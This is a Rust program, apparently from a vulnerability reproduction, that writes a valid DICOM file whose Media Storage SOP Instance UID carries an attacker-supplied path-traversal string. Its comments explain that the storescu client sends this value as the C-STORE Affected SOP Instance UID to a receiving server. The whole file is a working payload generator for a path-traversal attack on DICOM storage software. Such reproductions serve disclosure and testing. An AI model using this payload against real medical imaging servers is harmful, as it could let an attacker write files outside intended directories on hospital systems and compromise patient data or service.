// Builds a genuine, valid DICOM file whose File Meta Information's Media Storage SOP Instance
// UID contains a path traversal sequence. `storescu` (the real client used by this repro's
// driver script) reads this field and sends it verbatim as the C-STORE request's "Affected SOP
// Instance UID" - a real DICOM client is fully capable of constructing such a file, since
// nothing in the DICOM file format itself restricts what bytes can appear in a UI-VR element.
use dicom_core::{DataElement, PrimitiveValue, VR};
use dicom_dictionary_std::{tags, uids};
use dicom_object::{FileMetaTableBuilder, InMemDicomObject};

fn main() {
    let args: Vec<String> = std::env::args().collect();
    let out_path = &args[1];
    let evil_uid = &args[2];

    let obj = InMemDicomObject::from_element_iter([
        DataElement::new(
            tags::SOP_CLASS_UID,
            VR::UI,
            uids::SECONDARY_CAPTURE_IMAGE_STORAGE,
        ),
        DataElement::new(tags::SOP_INSTANCE_UID, VR::UI, "1.2.3.4.5.6.7.8.9\0"),
        DataElement::new(tags::PATIENT_NAME, VR::PN, "Evil^Test"),
        DataElement::new(tags::PATIENT_ID, VR::LO, "EVIL001"),
        DataElement::new(tags::MODALITY, VR::CS, "OT"),
        DataElement::new(tags::ROWS, VR::US, PrimitiveValue::from(1u16)),
        DataElement::new(tags::COLUMNS, VR::US, PrimitiveValue::from(1u16)),
        DataElement::new(tags::BITS_ALLOCATED, VR::US, PrimitiveValue::from(8u16)),
        DataElement::new(tags::BITS_STORED, VR::US, PrimitiveValue::from(8u16)),
        DataElement::new(tags::HIGH_BIT, VR::US, PrimitiveValue::from(7u16)),
        DataElement::new(
            tags::PIXEL_REPRESENTATION,
            VR::US,
            PrimitiveValue::from(0u16),
        ),
        DataElement::new(tags::SAMPLES_PER_PIXEL, VR::US, PrimitiveValue::from(1u16)),
        DataElement::new(tags::PHOTOMETRIC_INTERPRETATION, VR::CS, "MONOCHROME2"),
        DataElement::new(tags::PIXEL_DATA, VR::OB, PrimitiveValue::from(vec![0x55u8])),
    ]);

    let meta = FileMetaTableBuilder::new()
        .media_storage_sop_class_uid(uids::SECONDARY_CAPTURE_IMAGE_STORAGE)
        // this is the field storescu propagates onto the wire as the C-STORE
        // request's "Affected SOP Instance UID" - the attacker-controlled value
        .media_storage_sop_instance_uid(evil_uid.as_str())
        .transfer_syntax(uids::EXPLICIT_VR_LITTLE_ENDIAN)
        .build()
        .unwrap();

    let file_obj = obj.with_exact_meta(meta);
    file_obj.write_to_file(out_path).unwrap();
    println!("wrote evil file to {out_path} with SOP Instance UID = {evil_uid:?}");
}
